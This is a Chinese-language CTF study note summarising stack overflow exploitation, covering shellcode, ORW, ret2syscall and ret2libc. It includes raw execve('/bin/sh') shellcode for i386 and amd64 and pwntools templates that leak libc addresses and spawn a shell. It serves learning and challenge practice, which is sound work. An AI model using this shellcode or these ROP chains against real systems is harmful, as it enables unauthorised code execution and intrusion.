[toc]

## 栈溢出攻击总结

**备注**：陆陆续续也做了不少题目了，但是似乎缺乏一些系统性的总结，特别是在pwn这块，栈溢出的各种技巧有待持续加强。本篇首先总结一下栈溢出的一些方式。同时，也会把攻击脚本记录在这里，以便后续取用。

### 1、shellcode

#### 解释

控制程序执行流去执行机器码指令

#### 使用条件

可以控制EIP寄存器，程序关闭了NX保护或者某个可读可写段具有可执行权限。可以结合mprotect函数或者mmap函数执行攻击。

当程序关闭了NX保护，这个时候可以考虑shellcode，shellcode不一定是获取shell，也可以是ORW的shell，即为open(/flag)------read(3, addr, 0x30)------write(1, addr, 0x30)。

#### 解题脚本 

首先记录一些常用的shellcode，分别适用于32位和64位系统，更多shellcode可以访问[shellstorm](http://shell-storm.org/shellcode/)

```
shellcode---linux---execve(/bin/sh)
-----------------------------------------------------------------------------
i386, 长度23字节
shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

amd64，长度29字节
shellcode = "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
```

这里也放一下orw的shellcode，偶尔会遇到这种题。

```python
from pwn import *
# 这里的架构啥的都可以改
context.update(arch='i386', os='linux', endian='little')
shellcode = shellcraft.open('/home/orw/flag',0)
shellcode += shellcraft.read('eax','esp', 0x30)
shellcode += shellcraft.write(1, 'esp', 0x30)
print(asm(shellcode))

# 手写汇编
'''
/* push b'/home/orw/flag\x00' */
push 0x1010101
xor dword ptr [esp], 0x1016660
push 0x6c662f77
push 0x726f2f65
push 0x6d6f682f
mov ebx, esp
xor ecx, ecx
xor edx, edx
/* call open() */
push 5 /* 5 */
pop eax
int 0x80
/* read(fd='eax', buf='esp', nbytes=0x30) */
mov ebx, eax
mov ecx, esp
push 0x30
pop edx
/* call read() */
push 3 /* 3 */
pop eax
int 0x80
/* write(fd=1, buf='esp', n=0x30) */
push 1
pop ebx
mov ecx, esp
push 0x30
pop edx
/* call write() */
push 4 /* 4 */
pop eax
int 0x80
'''
```

### 2、ROP

#### 解释

所谓ROP，全名为return-oriented-program，是一种栈溢出的思想，用来攻击开启了ASLR、Canary、PIE等防护手段的程序，利用各种gadget，或巧妙的栈劫持方式，控制程序执行流，最终获取shell。

#### 使用条件

1. 存在栈溢出，可以获取有效的gadget，或者可以执行系统调用指令
2. 需要泄露libc加载的基地址或者程序加载的基地址
3. 能控制EIP指针

#### 2.1 ret2func

**使用**：当程序中存在一些后门函数，例如`system(/bin/sh)`或者`open('/flag')`之类的函数，可以将这些函数的地址pop到EIP寄存器，控制程序获取shell或者打印出来flag。

此类利用方式较为简单，只需要计算出buffer到函数返回地址的偏移即可。

#### 2.2 ret2syscall

**使用**：这里只需要明确概念，然后寻找对应的gadget即可。所谓ret2syscall，就是不直接调用libc函数，而是通过系统调用的方式，来执行相关函数。在i386下执行系统调用为`int 80`指令，amd64为`syscall`的gadget。这里也对传参寄存器进行总结：

```
i386:
eax存放系统调用号
ebx存放第一个参数
ecx存放第二个参数
edx存放第三个参数
int 80 执行系统调用
----------------------------------------------
amd64:
rax存放系统调用号
rdi存放第一个参数
rsi存放第二个参数
rdx存放第三个参数
syscall 执行系统调用
```

需要注意：

- 如果找不到对应的64位寄存器的gadget，可以尝试找找32位寄存器的，前提是参数可以只取低地址4个字节，不受高字节的影响。

- rax/eax会存放函数的返回值，所以，有时候找不到eax相关的gadget可以利用返回值来构造。
- 很缺gadget的话，可以利用ret2csu完成攻击

再总结一下常用的系统调用号对应函数：

```
i386:
函数名		系统调用号
read        3
write		4
open		5
execve		11
sigreturn	119

amd64:
read		0
write		1
open		2
execve		59
sigreturn	15
```

#### 2.4 ret2libc

**使用**：程序没有直接给system函数或者execve函数的地址，但是提供了puts、write等函数可以用于泄露函数的地址。构造ROP链来获取shell。

攻击模板：

```python
def ret2libc_i386_mannul():
    '''
    ret2libc，X86架构下，手动写rop链
    一般是结合LibcSearcher进行泄露system地址
    如果需要一些其他的操作，可以找一些pop指令用于清理栈
    
    '''
    elf = Elf('')
    io = process('')
    payload = b'xxx' # 前面的偏移
    payload += b'puts_plt' # 用于泄露地址的函数
    payload += elf.sym['main'] # 返回main函数
    payload += elf.got['puts'] # 要泄露的函数的got地址，这里泄露puts函数的地址
    io.send(payload)
    leak_addr = io.recv(4) # 获取到puts的地址
    # 接下来利用libcsearcher库来泄露函数地址
    libc = LibcSearcher('puts', leak_addr)
    libc_base_addr = leak_addr - libc.dump('puts')
    system_addr = libc_base_addr + libc.dump('system')
    str_bin_sh = libc_base_addr + libc.dump('str_bin_sh')
    
    # 第二次填充payload，执行system /bin/sh
    payload = b'xxx'
    payload += p32(system_addr)
    payload += b'aaaa'
    payload += p32(str_bin_sh)
    io.send(payload)
    


def ret2libc_amd64_mannual():
    '''
    ret2libc X64架构下 手动写payload
    '''
    elf = Elf('')
    io = process('')
    pop_rdi_ret_addr = 0x0 # 一下三个都是gadget，可以利用ROPgadget工具寻找
    pop_rsi_ret_addr = 0x0
    pop_rdx_ret_addr = 0x0
    payload = b'xxx' # 前面的偏移，直到函数返回地址
    payload += p64(pop_rdi_ret_addr) + p64(1) # write函数的第一个参数
    payload += p64(pop_rsi_ret_addr) + p64(elf.got['read']) # 第二个参数
    payload += p64(pop_rdx_ret_addr) + p64(0x20) # 第三个参数
    payload += p64(elf.plt['write']) # write函数的地址
    io.send(payload) 
    leak_addr = io.recv(6) #泄露出来的地址
    # 利用libc来计算
    libc = LibcSearcher('read', leak_addr)
    libc_base_addr = leak_addr - libc.dump('read')
    system_addr = libc_base_addr + libc.dump('system')
    str_bin_sh = libc_base_addr + libc.dump('str_bin_sh')
    
    payload = b'xxx'
    payload += p64(pop_rdi_ret_addr) + p64(str_bin_sh)
    payload += p64(system_addr)
    io.send(payload)
    
def ret2libc_pwntools():
    '''
    ret2libc。
    利用pwntools的工具来写payload，主要利用ROP类
    记得设置一下context, 改下架构即可
    '''
    context.update(arch='i386/amd64', os='linux', endian='little')
    elf = Elf('')
    io = process('')
    rop = ROP(elf)
    rop.raw(b'xxx') # 前面的填充
    rop.call('write', [1, elf.got['write'], 0x10]) # 调用write函数
    rop.call('main', []) # 回到main函数
    print(rop.dump()) # 这里打印下rop，可以检查一下有没有问题
    payload = rop.chain() # 生成payload
    io.send(payload)
    leak_addr = io.recv()
    # 利用libc来计算
    libc = LibcSearcher('read', leak_addr)
    libc_base_addr = leak_addr - libc.dump('read')
    system_addr = libc_base_addr + libc.dump('system')
    str_bin_sh = libc_base_addr + libc.dump('str_bin_sh')
    # 这里调用system可以这样
    rop = ROP(elf)
    rop.raw(b'xxx')
    rop.call(system_addr, [str_bin_sh])
    io.send(rop.chain())
```



